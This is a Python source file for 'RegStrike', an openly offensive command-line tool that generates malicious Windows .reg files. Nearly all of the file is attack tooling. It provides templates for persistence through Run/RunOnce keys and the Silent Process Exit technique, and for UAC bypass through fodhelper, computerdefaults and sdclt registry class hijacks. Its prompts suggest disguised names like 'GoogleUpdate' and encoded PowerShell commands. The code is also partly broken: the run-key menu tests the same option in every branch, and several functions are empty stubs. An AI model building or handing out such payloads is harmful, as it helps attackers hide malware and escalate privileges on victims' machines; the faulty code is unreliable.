
regstrike_banner = """
      ___          ___ _       _ _        
     | _ \___ __ _/ __| |_ _ _(_) |_____  
     |   / -_) _` \__ \  _| '_| | / / -_) 
     |_|_\___\__, |___/\__|_| |_|_\_\___| 
             |___/                        
    
    >> Create offensive .reg payloads easy peasy :)
       https://github.com/itaymigdal/RegStrike
       By Itay Migdal
    """
reg_file_name = "hi.reg"
payload_prefix = "Windows Registry Editor Version 5.00\n"
payload = payload_prefix
template_run = r"""
[{}\Software\Microsoft\Windows\CurrentVersion\{}]
"{}"="{}"
"""
template_spe = r"""
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{0}]
"GlobalFlag"=dword:00000200
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{0}]
"ReportingMode"=dword:00000001
"MonitorProcess"="{1}"
"""
template_uac = r"""
[HKEY_CURRENT_USER\software\classes\{}\shell\open\command]
"DelegateExecute"=""
""="{}"
"""


def sanitize_command(command):
    bad_chars = {
        '"': r'\"'
    }
    for c in bad_chars:
        command = command.replace(c, bad_chars[c])
    return command


def set_run():
    global payload
    while True:
        print("[>] Choose hive and key:")
        print("[1] HKCU, Run")
        print("[2] HKCU, RunOnce")
        print("[3] HKLM, Run (requires admin)")
        print("[4] HKLM, RunOnce (requires admin)")
        i = int(input(">> "))
        if i == 1:
            run_hive = "HKEY_CURRENT_USER"
            run_key = "Run"
        elif i == 1:
            run_hive = "HKEY_CURRENT_USER"
            run_key = "RunOnce"
        elif i == 1:
            run_hive = "HKEY_LOCAL_MACHINE"
            run_key = "Run"
        elif i == 1:
            run_hive = "HKEY_LOCAL_MACHINE"
            run_key = "RunOnce"
        else:
            print("[-] No such option :(")
            continue
        print("[>] Enter key data name (e.g. GoogleUpdate):")
        data_name = input(">> ")
        print(r"[>] Enter the command to execute (e.g. 'pOwErShElL -enc aQBlAHgAIA...')")
        command = sanitize_command(input(">> "))

        payload += template_run.format(run_hive, run_key, data_name, command)
        print("[+] Added")
        return


def set_spe():
    global payload
    print("[>] Enter the process name that when exits will trigger the command (e.g. notepad.exe)")
    process_name = input(">> ")
    print(r"[>] Enter the command to execute (e.g. 'pOwErShElL -enc aQBlAHgAIA...')")
    command = sanitize_command(input(">> "))
    payload += template_spe.format(process_name, command)
    print("[+] Added")


def add_persistence():
    print("[>] Choose:")
    print("[1] Add persistence using a Run/RunOnce key")
    print("[2] Add persistence using Silent Process Exit technique (requires admin)")
    print("[3] Back")
    i = int(input(">> "))
    if i == 1:
        set_run()
    elif i == 2:
        set_spe()
    elif i == 3:
        return
    else:
        print("[-] No such option :(")


def add_uac_run():
    global payload
    while True:
        print("[>] Choose key:")
        print("[1] Run")
        print("[2] RunOnce")
        i = int(input(">> "))
        if i == 1:
            run_key = "Run"
        elif i == 2:
            run_key = "RunOnce"
        else:
            print("[-] No such option :(")
            continue
        print("[>] Choose UAC Bypass method:")
        print("[1] Fodhelper")
        print("[2] ComputerDefaults")
        print("[3] Sdclt")
        i = int(input(">> "))
        if i == 1:
            reg_class = "ms-settings"
            uac_binary = "fodhelper.exe"
        elif i == 2:
            reg_class = "ms-settings"
            uac_binary = "computerdefaults.exe"
        elif i == 3:
            reg_class = "folder"
            uac_binary = "sdclt.exe"
        else:
            print("[-] No such option :(")
            continue
        print("[>] Enter key data name (e.g. GoogleUpdate):")
        data_name = input(">> ")
        print(r"[>] Enter the command to execute (e.g. 'pOwErShElL -enc aQBlAHgAIA...')")
        command = sanitize_command(input(">> "))
        payload += template_uac.format(reg_class, uac_binary)
        payload += template_run.format("HKEY_CURRENT_USER", run_key, data_name, command)
        print("[+] Added")
        return


def add_obfuscation():
    pass


def list_current_payload_actions():
    pass


def print_payload():
    print(payload)


def reset_payload():
    pass


def save_payload():
    pass


def main_screen():
    while True:
        print("[>] Choose:")
        print("[1] Add persistence")
        print("[2] Add UAC bypass + Run key")
        print("[3] Add obfuscation")
        print("[4] List current payload actions")
        print("[5] Print payload")
        print("[6] Reset payload")
        print("[7] Save payload")
        print("[8] Exit")
        i = int(input(">> "))
        if i == 1:
            add_persistence()
        elif i == 2:
            add_uac_run()
        elif i == 3:
            add_obfuscation()
        elif i == 4:
            list_current_payload_actions()
        elif i == 5:
            print_payload()
        elif i == 6:
            reset_payload()
        elif i == 7:
            save_payload()
        elif i == 8:
            return
        else:
            print("[-] No such option :(")


def main():
    print(regstrike_banner)
    main_screen()


if __name__ == '__main__':
    main()
    